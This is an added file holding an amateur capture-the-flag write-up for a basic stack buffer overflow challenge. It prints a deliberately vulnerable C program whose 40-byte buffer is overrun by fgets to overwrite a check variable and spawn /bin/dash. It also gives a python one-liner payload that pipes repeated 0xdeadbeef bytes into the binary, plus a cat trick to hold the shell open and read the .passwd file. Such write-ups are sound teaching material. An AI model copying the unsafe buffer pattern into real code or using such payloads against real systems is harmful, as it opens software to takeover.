@@ -1,0 +1,54 @@
+First of all Hellow in my gitHUb
+am gonna show y'all a simple write-up for a basic Ctf (Buffer Overflow )
+
+I - Code Source : 
+------------------------------------------------------------------------------
+    #include <stdlib.h>
+    #include <stdio.h>
+     
+    /*
+    gcc -m32 -o ch13 ch13.c -fno-stack-protector //How to compile
+    */
+     
+     
+    int main()
+    {
+     
+      int var;
+      int check = 0x04030201;
+      char buf[40];
+     
+      fgets(buf,45,stdin);
+     
+      printf("\n[buf]: %s\n", buf);
+      printf("[check] %p\n", check);
+     
+      if ((check != 0x04030201) && (check != 0xdeadbeef))
+        printf ("\nYou are on the right way!\n");
+     
+      if (check == 0xdeadbeef)
+       {
+         printf("Yeah dude! You win!\nOpening your shell...\n");
+         system("/bin/dash");
+         printf("Shell closed! Bye.\n");
+       }
+       return 0;
+    }
+------------------------------------------------------------------------------
+1 - Login To ssh Using putty Or Simply using Terminal.
+2 - By reading the c code of the Program :
+    a : a check Variable (0x04030201) in Bigger endian forme you can check https://docs.python.org/2/library/struct.html
+        and a buffer varriable.
+    b : an if statement which it test if check not equels to 0x04030201 and 0xdeadbeef and display an output.
+    c : a second if statement whitch test if check equels to 0xdeadbeef and display an output.
+    
+3 - we gonna use the second if ! now how
+    a : We know that buf variable is an array with a size of 40
+        we gonna give the program like 50 or 45 little indian form of 0xdeadbeef so our payload gonna be like :
+        python -c 'print "\xef\xbe\xad\xde"*50 ' | ./ch13
+    b : we got a shell but it opens and close in the same time so we gonna hold it by using cat command by the payload :
+        (python -c 'print "\xef\xbe\xad\xde"*50 ' ;cat ) | ./ch13
+4 : finaly we cat the .passwd file and we get the password !
+  
+  Thank you for reading My first Write-up and am sorry For my bad English
+------------------ Congratulation ------------------
